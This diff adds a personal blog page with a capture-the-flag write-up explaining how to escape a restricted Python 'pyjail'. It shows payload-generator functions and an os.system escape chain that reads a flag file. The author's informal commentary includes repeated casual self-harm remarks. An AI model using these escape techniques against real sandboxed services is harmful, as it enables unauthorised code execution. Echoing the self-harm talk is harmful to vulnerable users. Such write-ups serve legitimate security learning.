@@ -1,0 +1,287 @@
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>wrenches.online</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/styles/base16/gruvbox-dark-soft.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  </head>
+  <body class="bg-stone-900 text-stone-300">
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <main class="relative mx-auto w-4/5 mt-10 text-xl mb-[75px]">
+        <div class="my-8 text-3xl font-bold text-orange-200 header">wrenches.online</div>
+        <hr class="my-8">
+        <div class="header my-8 text-2xl font-bold">modulo</div>
+        <div class="my-8 text-1xl">
+            this is from scriptctf. i wasnt an active participant but i got pinged specifically 2 solve this pyjail chal and i thought it was quite fun and a good opportunity to elucidate basic pyjail techniques (such as, thinking of breaking out of the pyjail in terms of 'primitives').
+
+            <br><br>
+
+            <img src="https://64.media.tumblr.com/02e288ef81f88e347ad2bbc966aff82c/15dffd7ee37f8eab-11/s500x750/fcbfaaafc3645c6b9bc27a27b7ee4c4587088cc0.jpg" style="width: 25%">
+
+            <br><br>
+
+            sotd is <a href="https://www.youtube.com/watch?v=VqhhEGbSfRM"> ゲシュタルト後悔 </a> by this band caramel candid, they're a new jrock band with a frontwoman who's got some real fucking swag to her vocals and i'm a big fan of how she really belts that shit. i still want to kill myself but a little less so this writeup will be more serious and less psychotic.
+        </div>
+        <pre><code class="language-python">
+import ast
+print("Welcome to the jail! You're never gonna escape!")
+payload = input("Enter payload: ") # No uppercase needed
+blacklist = list("abdefghijklmnopqrstuvwxyz1234567890\\;._")
+for i in payload:
+    assert ord(i) >= 32
+    assert ord(i) <= 127
+    assert (payload.count('>') + payload.count('<')) <= 1
+    assert payload.count('=') <= 1
+    assert i not in blacklist
+
+tree = ast.parse(payload)
+for node in ast.walk(tree):
+    if isinstance(node, ast.BinOp):
+        if not isinstance(node.op, ast.Mod): # Modulo because why not?
+            raise ValueError("I don't like math :(")
+exec(payload,{'__builtins__':{},'c':getattr}) # This is enough right?
+print('Bye!')
+        </code></pre>
+
+        <div class="my-8 text-1xl">
+            <b>brief rundown</b>: restricted charset (only allowed 'c'), no dunders or strings, but we're given getattr. we're also given exactly one var assignment with the <span class=font-mono>=</span> count and we're limited on binary operators.
+        </div>
+
+        <div class="my-8 text-1xl">
+          <b>first basic technique: tabulate what is possible.</b> instead of thinking in terms of the blacklist (what you cannot do), mentally reframe the challenge in terms of what you can do. a basic repl script to identify all characters you can input:
+        </div>
+
+        <pre><code class="language-python">
+>>> from string import printable
+>>> blacklist = list("abdefghijklmnopqrstuvwxyz1234567890\\;._")
+>>> "".join([char for char in printable if char not in blacklist])
+'cABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-/:<=>?@[]^`{|}~ \t\n\r\x0b\x0c'
+        </code></pre>
+
+        <div class="my-8">
+          so, what do we have?
+          <br><br>
+          <ol>
+            <li>all uppercase chars</li>
+            <li><span class=font-mono>{} </span>curly braces (for f-strings and dicts)</li>
+            <li><span class=font-mono>() </span>parens (for tuples, func calls)</li>
+            <li><span class=font-mono>[] </span>square brackets (lists, indexing)</li>
+            <li><span class=font-mono>-+*/% </span>arithmetic operators</li>
+            <li><span class=font-mono>"' </span>quotes for string defns</li>
+          </ol>
+          <br>
+          we'll keep this list handy as we delve into the Consequent Basic Technique (CBT for short):
+        </div>
+
+        <div class="my-8">
+
+          <b>CBT 2: rephrase the problem in terms of primitives.</b> our end goal is to eventually call <span class="font-mono">cat flag.txt</span>. we do this by importing the <span class="font-mono">os</span> class, then getting its <span class="font-mono">system</span> func, then calling it with our string arg. note that we are given getattr for free (how kind), but getattr is only useful if we have a module object and arbitrary strings, which we do not have.
+
+        </div>
+
+        <div class="my-8">
+          so our first primitive we should try to aim for is arbitrary string building. note that 'primitive' is kind of a misnomer here, because we can actually further break this down into arbitrary <i>char</i> building. chars are typically generated through three different ways, and this is kind of just pyjail-fu you pick up on after years (more like months (more like days really)) of familiarity with this kind of challenge:
+        </div>
+
+        <ol>
+          <li><span class=font-mono>chr()</span> with arbitrary integers: <br><span class=font-mono>chr(105) + chr(109) + chr(32) + chr(103) + chr(111) + chr(110) + chr(110) + chr(97) + chr(32) + chr(107) + chr(105) + chr(10\
+8) + chr(108) + chr(32) + chr(109) + chr(121) + chr(115) + chr(101) + chr(108) + chr(102) == 'im gonna kill myself'</span></li>
+          <li>string indexing with string representations of objects:<br>
+          <span class=font-mono>str(str)[3:6] == 'ass'</span></li>
+
+          <li><span class=font-mono>f"{}"</span> f-strings, string-formatting<br>
+          <span class="font-mono">"%d"%10 == '10'</span>
+          </li>
+        </ol>
+
+        <div class="my-8">
+          then, just eyepower and eliminate things that are obviously infeasible. we can't call <span class="font-mono">chr</span> because we don't have lowercase chars. we can't call <span class=font-mono>str</span> either. only thing left is f-strings, and luckily enough our only valid character, <span class=font-mono>c</span> is a valid format string specifier that takes arbitrary integer inputs and runs <span class=font-mono>chr()</span> on it. 
+        </div>
+
+        <pre><code>
+>>> "%c"%42
+'*'
+        </code></pre>
+
+        <div class="my-3">
+          clearly this is intentional, and therefore a good segue into CBT 3, which is:
+          <br><br>
+          <b>CBT 3: consider the challenge from the eyes of the setter.</b> challenges do not metastasize out of thin air, they are constructed by a (hopefully) intelligent person with a clear, sound reasoning behind each step and path. this especially applies to pyjails, which argetattre basically only constructible by a setter ideating a list of constraints, trying to solve the challenge with those constraints, and when those constraints prove too difficult, <i>lessening the constraints</i> by giving the solver more tools with which to wriggle.
+          <br><br>
+          you can see this in full effect w/ this chall: the setter gave themselves the single lowercase char <span class="font-mono">c</span> (and also just a free <span class=font-mono>getattr</span> but we'll get to that later) so it's always a good idea to consider <i>why</i> exactly this tool was left there. if the author is kind and the ctf is trustworthy, it is typically for good reason, and investigating that possible reason is worthwhile. here we see that the char <span class=font-mono>c</span> allows us string formatting.
+
+          <br><br>
+
+          now we cannot make use of this arbitrary char primitive without first having an arbitrary <i>int</i> primitive - we need to construct integers with our given charset. now, we are given arithmetic ops with <span class="font-mono">+-*/%</span> but the ast checker only allows us modulo ops, which are basically useless.
+        </div>
+
+        <pre><code class="language-python">
+tree = ast.parse(payload)
+for node in ast.walk(tree):
+    if isinstance(node, ast.BinOp):
+        if not isinstance(node.op, ast.Mod): # Modulo because why not?
+            raise ValueError("I don't like math :(")
+        </code></pre>
+
+        <div class="my-8">
+          (as a small aside modulo being allowed is actually a hint towards how python overloads the ops for <span class=font-mono>%</span> to be both modulo and string-formatting, which is why i quite like this challenge because i think that's a good, well placed hint)
+
+          <br><br>
+
+          ok anyways, arbitrary ints: there are two tricks here, first is that python's typing is anyhow dogshit. we can cast from bool to int to str quite implicitly and easily which allows for some insano tricks like <span class="font-mono">-True == 1</span>. we can get bools with our single <span class=font-mono>></span> allowance by just doing something like <span class="font-mono">()<()</span>, because of course tuples have a greater-than and lesser-than dunder method, why the fuck wouldnt they :)
+
+          <br><br>
+
+          the second trick: note that the ast tree walk only disallows <i>binary ops</i> - meaning arithmetical ops that operate on two numbers, things like <span class="font-mono">2+2=4</span> (minus 1 thats 3 quick maths). but of course much like how the existence of superman must imply the existence of sdownerman there are also <i>unary ops</i>, like: <span class="font-mono">-5</span>. the <span class=font-mono>-</span> is acting on the single argument <span class=font-mono>5</span> and negating it. the two unary ops of importance ary unary not and unary invert (i.e. negation) and the unary not is what we want here. recalling that taking the unary not of any integer n just results in the following: <br><br><span class="font-mono">
+            ~n = -(n+1)
+          </span>
+          <br><br>
+          we just further negate it to kind of make a fucked up looking successor func:<br><br>
+          <span class="font-mono">
+            -~n = n+1
+          </span>
+          <br><br>
+          and given that we can cast bools to ints and we know how to generate bools, we now have arbitrary int generation, and therefore arbitrary char generation. hooray!
+
+          <pre><code class="language-python">
+>>> -~-~-~-~-~-~-~-~-(()<())
+8
+>>> "%c"%-~-~-~-~-~-~-~-~-(()<())
+'\x08'
+          </code></pre>
+
+          <div class="my-8">
+            this arb char primitive is quite evocative, to me, of those old ascii arts of cocks, but dats besides the point. now with arbitrary char generation we need arbitrary string generation. note that python has implicit string concat (for some reason) by doing this:
+          </div>
+
+<pre><code>
+>>> "kill""myself"
+'killmyself'
+</code></pre>
+
+          <div class="my-8">
+            we don't actually need the <span class="font-mono">+</span> operator here, which is good because it's a binop and therefore blacklisted by our ast walk. but however due to the way we construct our strings with the format specifier, these are actually going to pop a syntaxerror if we try to directly concat:
+          </div>
+
+          <pre><code class=language-python>
+>>> "%c"%-~-~-~-~-~-~-~-~-(()<())"%c"%-~-~-~-~-~-~-~-~-(()<())
+  File "<python-input-49>", line 1
+    "%c"%-~-~-~-~-~-~-~-~-(()<())"%c"%-~-~-~-~-~-~-~-~-(()<())
+                                 ^^^^
+SyntaxError: invalid syntax
+          </code></pre>
+
+          <div class="my-8">
+            one last trick up our sleeve wrt string generation is wrapping all this shit in an f string, which thankfully, does obey string concatenation. i hope the following examples are elucidatory enough, because it's 4am and i don't really feel like explaining this shit.
+          </div>
+          <pre><code class=language-python>
+>>> f"imgay"f"imgay"
+'imgayimgay'
+>>> f"imgonnakill"f"myself"
+'imgonnakillmyself'
+>>> f'{"%c"%-~-~-~-~-~-~-~-~-(()<())}'
+'\x08'
+>>> f'{"%c"%-~-~-~-~-~-~-~-~-(()<())}'f'{"%c"%-~-~-~-~-~-~-~-~-(()<())}'
+'\x08\x08'
+          </code></pre>
+
+          <div class="my-8">
+            and our ONE last hurdle here is that this actually uses <span class="font-mono"><</span> twice. ideally we want a way to craft bools without having to resort to the comparison opcode (which thankfully does not count as a binop!), but i didn't figure out how to do this, so i resorted to just assigning our bool as a variable with our single <span class="font-mono">=</span> allowance and referring to the variable as necessary. but this also comes with its own hurdle, that being <span class="font-mono">exec</span> only allows one line each (given we don't have <span class=font-mono>;</span> to insert newlines)-
+          </div>
+          <div class="my-8">
+            actually, as i'm writing this i realised <span class="font-mono">\n</span> was actually allowed and you could have just done <span class="font-mono">Z=()<()\n~-Z</span> and <span class="font-mono">exec</span> would happily parse it, but i felt very clever about my workaround to this, which is by putting the variable defn and the payload in a tuple, then using the walrus operator to perform variable assignment at runtime:
+          </div>
+
+          <pre><code class="language-python">
+>>> (Z='a', Z)
+  File "<python-input-71>", line 1
+    (Z='a', Z)
+     ^^^^^
+SyntaxError: invalid syntax. Maybe you meant '==' or ':=' instead of '='?
+>>> (Z:='a', Z)
+('a', 'a')
+          </code></pre>
+
+          <div class="my-8">the walrus op allows us to have an assignment that is also an expression, which is typically a big No No (note how it errors in the first example) - honestly i just felt Right Chuffed about thinking about this and wanted to include it. anyways, our arb string payload is very, very unwieldy, so we can just write a quick func to generate the necessary strings:</div>
+
+          <pre><code class=language-python>
+
+def get_num(i):
+    string = '--Z'
+    for _ in range(i-1):
+        string = f'-~{string}'
+    return string
+
+def get_char(char):
+    x = ""
+    for _ in [70, 34, 123, 39, 37, 99, 39, 37]: x += chr(_)
+    x += get_num(ord(char))
+    for _ in [125, 34]: x += chr(_)
+    return x
+
+def get_string(string):
+    return "".join(get_char(c) for c in string)
+          </code></pre>
+
+          <div class="my-8">
+            forgive the abstruse string generation here, dealing with generating f-strings is a fucking nightmare because of curly braces not being properly escaped in f-strings, aaah, fuck my gay life, but whatever it works
+          </div>
+
+          <pre><code class="language-python">
+>>> exec("Z='Z'>'A'\n" + "print(" + get_string("skibidi") + ")" )
+skibidi
+          </code></pre>
+
+          <div class="my-8">
+            okay i'm going to handwave over a lot of stuff now. with arbitrary string generation and <span class="font-mono">getattr</span>, this challenge is essentially solved, because that func is stupid powerful and lets us do a lot of things. the first thing we do is we need to access <span class=font-mono>builtins</span>, and we take advantage of the fact that each builtin func has a <span class="font-mono">__self__</span> arg that points to our requisite module. note that our builtins are actually just an empty dict, meaning we have no chr or str or print, but we do have... <span class="font-mono">getattr</span> itself!
+          </div>
+
+          <pre><code class="language-python">
+>>> getattr(getattr, "__self__")
+&lt;module 'builtins' (built-in)>
+          </code></pre>
+
+          <div class="my-8">
+            and now we just do our standard chain. we grab our <span class="font-mono">__import__</span> func, call it on <span class="font-mono">os</span>, and then further call <span class="font-mono">cat flag.txt</span> on its <span class="font-mono">system</span> attr.
+          </div>
+
+          <pre><code class=language-python>
+>>> getattr(getattr(getattr(getattr, "__self__"), "__import__")("os"), "system")("cat flag.txt")
+cat: flag.txt: No such file or directory
+256
+          </code></pre>
+
+          <div class="my-8">
+            so with our tricks we just convert this into our obfuscated version. i don't feel like doing this in this writeup but i guess you just have to trust me that it works, and also the payload ends up being 6000 chars so i also don't feel like posting it here. you can generate it yourself. my back fucking hurts and it's 6am and i have some shit to do at 8am later and i'm going to shoot myself in the head. i hope this pyjail writeup was Elucidatory. i'd write about the ctf itself but i didn't really do it aside from this challenge, which i thought was a fun puzzle. #KAWOSHIN2025.
+          </div>
+
+          <img style='width:250px' src="https://i.redd.it/lqxa5zuxaf1a1.jpg">
+        </div>
+
+        <a class="float-right" href="/">back</a>
+
+        <footer class="mt-20 text-bases text-orange-200 italic text-right opacity-25"> And what rough beast, its hour come round at last, slouches towards Bethelehem to be born? 2024-2025</footer>
+    </main>
+
+    <div class="sticker">
+      <img src="images/images.gif">
+    </div>
+
+  </body>
+  <script>hljs.highlightAll();</script>
+
+  <style>
+    ol {
+      list-style-type: square;
+      margin-inline: 20px;
+    }
+
+    div {
+      text-align: justify;
+    }
+  </style>
+</html>
